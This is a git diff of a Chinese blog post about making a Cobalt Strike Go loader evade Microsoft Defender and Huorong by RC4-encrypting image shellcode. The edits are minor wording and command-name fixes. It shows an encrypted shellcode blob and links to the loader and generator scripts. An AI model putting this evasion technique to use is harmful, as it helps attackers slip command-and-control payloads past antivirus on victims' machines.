@@ -53,7 +53,7 @@ golang版成功通过微软Defender/火绒免杀；
 
 建议自己尝试一下过程，可以参考上面的README，或者我这里传了一份[梳理过后的代码](https://github.com/Bin4xin/bigger-than-bigger/blob/master/Bypass-antivirus/Cobalt-Stike/golang/CS-Loader.go)
 
-下面看一下tupianshellcode的加密生成方式
+下面看一下图片shellcode的加密生成方式
 
 ### 3x01 图片shellcode生成
 
@@ -112,14 +112,13 @@ def rc4(text, key):
 加密效果：
 
 ```bash
-# python generator.py
+$ python generator.py
 ADdk943ZPviJWuFP5HO6HsUbbf3/UibLBKbjBQNvx314kU2L8vjUSpdIwV/cx20/2W0Skzghdf4oYRZfF1/0P+xhSgYqRXESzhXpqoLHXiVzDyezyOp9p03As6I3lXCP9w9r+CBG5VQIg3sCak05aAG1rRAoAD8L7FbzFQCbnhn+BgKe4A7J95vKyGzmFBuNiQoBqOEbNKNuF6oaXbsDTw6s9ymflG7yna8Os9zOOS4JSFZ5Ds4slcQ6pFHZK16OERLSN9x8hdjlLVKUKqTmPhl1Y3hepr2nF5G/NkS6esZTEsEJHRPcXpQineKVL/T5uxoliiLOeZdjlrGgnDGrgMC5N8O66DXyK3bGdYpVMrzj9iQzCwdXn0PdquAhAZynjtos1c6S4De9EVxbJaes6k/QeCjrkD234qPTt5c4C8zm/bhrZ0ghVAAl4LPwiPZsu5bYONMeYApBJ81IBec46RSFFN5LWzdhJEutJDx9w/AyYS1iphRShAczz6GmeVDaXeY83LhzKNKMlXNJfVv57DFDX4MiKiZq4SO5roUkUQ1mTYCG3LzdTFDhC7JQdwML2WBwubnPt8kCs6woxC0P2y5eAn77KivDovGsB3INBxqErgonfKWPgcCJVixYBfRP7FxfBYoAjw9xiiLuwDOxQaYAKGAfPI/9ctphRPWa8ZPzaJ7fpF4dO8UERVh0/IYlgeJx9hLVvEkjf9O0y1O688E1Giuo+D8pgdZo4WnsTWNBfU+woqo/34ZzxHV/3xKFlKljBD0+XoyKTLYmUju6pwv5TEfBbiMd+Hrs5Oh9s0fkKOyybuhrCEX8zrpMHcNhng996olYzcKNxCoZzDuFFvDwGkX3vXNN+GWTgKZc6lnp+hrX2Z0ZDaivLVyZU2NCS6YBq7BjEgntO2oYWlRiUXUKejHysunVUVE4LPtiO6nAJXTELd3SAXG8G4Sy5RjDK3c0GaAjvaeJ0//TpFecPPvMOJCukvvwoUTziex5cQ8Q+C6TwQKlO0zgHdXHALfkkSroBBGmqGZjqdCgaTTKHKOoAC9STz83g6jsI//Jpkjfwc3Avp75u1/4dswHjJk73Ncl9VMXxvMAVFqHzFM1+zuDQo74fw1DLwwXMLDoBuBgD5kf5emmhgDtFRDO5FofOlhQ4L06vNgGJw7s1D1b76YWmY6xv5Uk1IvTYqn8cb4bFzHrQgwuhPcBpITJ7Q7Wu7HZhlLkfKLor7kso4fn0gDUv258Q1MDelXWABmdlkzYSKOUOnsRUTi2hSI65Wy9GgL6IAyMx6vo/iwuKlYlkBafqPjFNY2O3LhVgTYrxmC8y7oXHnBR23wFNrNXlvtct/B8xIL8hiPA4rVcpK2ouPacFZYbdjS74JUdHwKMv5lAC3UpmoevzCQzcze0R03R5p6ZHgvjLxuqKFBkKSgHrAbivLnMEPDXzK3UeKSvG2ftsZiXPCPMZTjD0jBti4ubHc++RzHVC+Zq6ioj3nXjifF2FoJcnPGcdKkYHZBZlL6X5ptXxsT2FFtUTgZYD+iBnS4UlmTdK/oKNsds+ma8E1iBv4K04P83bSIgvunvA/xFX3N6u0m5qevZemY+RTsynSjPrg==
 #看起来像base64，实际上无法反编码
 
-$ python 1.py |base64 -d
+$ python generator.py |base64 -d
 7d��>�Z�O�s����R&���o�}x�M����J�H�_��m?�m�8!u�(a__�?�aJ*Eq�骂�^%s'���}�M���7�p��k� F��{jM9h��(?
 ...
-
 ```
 
 实际上，我们在做渗透的时候也可以发现这样类似的加密算法，代码我也放到了[Bigger仓库::generator.py](https://github.com/Bin4xin/bigger-than-bigger/blob/master/Bypass-antivirus/Cobalt-Stike/golang/generator.py)，当然具体问题具体分析，权当抛砖引玉；
